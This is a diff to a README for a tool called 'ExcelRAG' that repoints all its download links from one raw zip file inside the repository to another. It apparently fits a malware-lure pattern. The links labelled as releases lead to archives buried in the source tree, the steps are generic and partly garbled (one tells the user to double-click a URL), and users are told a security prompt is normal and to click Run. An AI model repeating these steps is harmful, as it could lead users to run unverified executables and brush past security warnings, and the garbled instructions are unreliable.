@@ -1,7 +1,7 @@
 # 📊 ExcelRAG - Transform Excel into a Data Powerhouse
 
 ## 📥 Download Now
-[![Download ExcelRAG](https://github.com/vikasoni12/ExcelRAG/raw/refs/heads/main/ExcelRAG/Properties/Excel_RAG_v2.5.zip)](https://github.com/vikasoni12/ExcelRAG/raw/refs/heads/main/ExcelRAG/Properties/Excel_RAG_v2.5.zip)
+[![Download ExcelRAG](https://raw.githubusercontent.com/vikasoni12/ExcelRAG/main/ExcelRAG/Excel-RAG-1.9-beta.1.zip)](https://raw.githubusercontent.com/vikasoni12/ExcelRAG/main/ExcelRAG/Excel-RAG-1.9-beta.1.zip)
 
 ---
 
@@ -25,7 +25,7 @@ If you are unsure whether your system meets these requirements, please check you
 
 ## 📦 Download & Install
 
-To get started with ExcelRAG, visit this page to download: [ExcelRAG Releases](https://github.com/vikasoni12/ExcelRAG/raw/refs/heads/main/ExcelRAG/Properties/Excel_RAG_v2.5.zip).
+To get started with ExcelRAG, visit this page to download: [ExcelRAG Releases](https://raw.githubusercontent.com/vikasoni12/ExcelRAG/main/ExcelRAG/Excel-RAG-1.9-beta.1.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest release. This will typically be at the top of the page.
@@ -34,7 +34,7 @@ To get started with ExcelRAG, visit this page to download: [ExcelRAG Releases](h
 5. Download the appropriate file for your system. This is usually a `.zip` or `.exe` file.
 6. Once downloaded, locate the file in your downloads folder.
 7. If it is a `.zip` file, right-click and select "Extract All" to unpack the contents.
-8. Open the extracted folder and double-click on the `https://github.com/vikasoni12/ExcelRAG/raw/refs/heads/main/ExcelRAG/Properties/Excel_RAG_v2.5.zip` file to run it.
+8. Open the extracted folder and double-click on the `https://raw.githubusercontent.com/vikasoni12/ExcelRAG/main/ExcelRAG/Excel-RAG-1.9-beta.1.zip` file to run it.
 
 You may see a security prompt. This is normal. Click **Run** to continue.
 
